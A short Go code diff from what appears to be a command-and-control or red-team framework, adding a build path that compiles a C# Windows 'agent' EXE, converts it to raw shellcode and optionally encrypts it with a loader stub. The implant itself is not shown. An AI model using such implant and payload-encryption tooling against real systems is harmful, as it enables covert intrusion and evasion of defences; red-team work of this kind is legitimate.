@@ -1131,6 +1131,33 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// C# agent — Windows EXE compiled with mcs (Mono), runs on .NET Framework 4.x
+	if cfg.Lang == "csharp" {
+		csPath, err := BuildCSharpEXE(cfg, payloadsDir)
+		if err != nil {
+			jsonErr(w, "csharp build: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		if cfg.Format == "bin" {
+			if rawPath, err := BuildRAW(csPath, payloadsDir); err == nil {
+				result["bin"] = rawPath
+				if cfg.Encrypt != "" {
+					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
+						result["enc"] = encPath
+						result["stub"] = stubPath
+					}
+				}
+			} else {
+				jsonErr(w, "csharp raw build: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
+		} else {
+			result["exe"] = csPath
+		}
+		jsonOK(w, result)
+		return
+	}
+
 	// Loader formats (loader-c, loader-nim, loader, loader-go) need to reach the
 	// switch block below so they can select the right implant build per lang.
 	// Skip the lang-specific fast path for those formats.
